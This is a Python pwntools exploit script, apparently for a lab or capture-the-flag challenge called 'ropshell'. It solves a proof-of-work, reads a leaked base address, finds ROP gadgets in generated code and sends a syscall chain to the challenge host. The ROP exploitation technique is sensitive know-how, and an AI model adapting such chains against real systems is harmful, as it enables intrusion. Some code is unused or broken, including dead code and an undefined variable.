#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import sys
import ctypes

from pwn import *

def solve(r):
    prefix=r.recvline().decode().split('\'')[1]
    for i in range(1000000000000):
        h=hashlib.sha1((prefix+str(i)).encode()).hexdigest();
        if(h[:6]=='000000'):
            ans=str(i).encode()
            break;
    print(time.time())
    r.sendlineafter(b'string S: ',base64.b64encode(ans));

def upload(fn):
    r.recvuntil(b'finish the transmission.\n\n');
    with open(fn, 'rb') as f: z = f.read();
    print("\x1b[1;32m** local md5({}): {}\x1b[m".format(fn, hashlib.md5(z).hexdigest()));
    z = base64.b64encode(z);
    for i in range(0, len(z), 768):
        r.sendline(z[i:i+768]);
    r.sendline(b'EOF');
    while True:
        z = r.recvline();
        if b'md5' in z:
            print(z.decode().strip());
 
def gen_code():
    libc = ctypes.CDLL(ctypes.util.find_library("C"))
    libc.srand(45510)
    LEN_CODE = 10*0x10000
    code = b''
    for i in range(LEN_CODE//4):
        a=(((libc.rand()&0xffff)<<16)|(libc.rand()&0xffff)).to_bytes(4,'little')
        code=b''.join([code,a])
        """
        print(hex(i*4),a.hex()[0:2])
        print(hex(i*4+1),a.hex()[2:4])
        print(hex(i*4+2),a.hex()[4:6])
        print(hex(i*4+3),a.hex()[6:8])
        """
    code = bytearray(code)
    rp = ((libc.rand())%(LEN_CODE//4-1))*4
    code[rp]= 0x0f
    code[rp+1]= 0x05
    code[rp+2]= 0xc3
    code[rp+3]= 0x00
    return code

def gadget(base,code,tar):
    return base+code.find(asm(tar))

def main():
    context.arch = 'amd64'
    context.os = 'linux'
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
    if type(r) != pwnlib.tubes.process.process:
        solve(r)
    r.recvuntil(b"Timestamp is ")
    timestamp = r.recvline().decode().strip()
    r.recvuntil(b"Random bytes generated at ")
    base = int(r.recvline().decode().strip(),16)

    log.info(f"{timestamp=}")
    log.info(f"{base=}")

    code = os.popen(f"./codegen {timestamp}").read()
    code = bytearray.fromhex(code)

    rax = gadget(base,code,"pop rax;ret")
    rdi = gadget(base,code,"pop rdi;ret")
    syscall = gadget(base,code,"syscall;ret")
    flag = gadget(base,code,'/FLAG')
    r.send(p64(rax)+p64(60)+p64(rdi)+p64(37)+p64(syscall))

    
    r.interactive()
    return
    r.send(nop.encode())




if __name__ == '__main__':
    main()
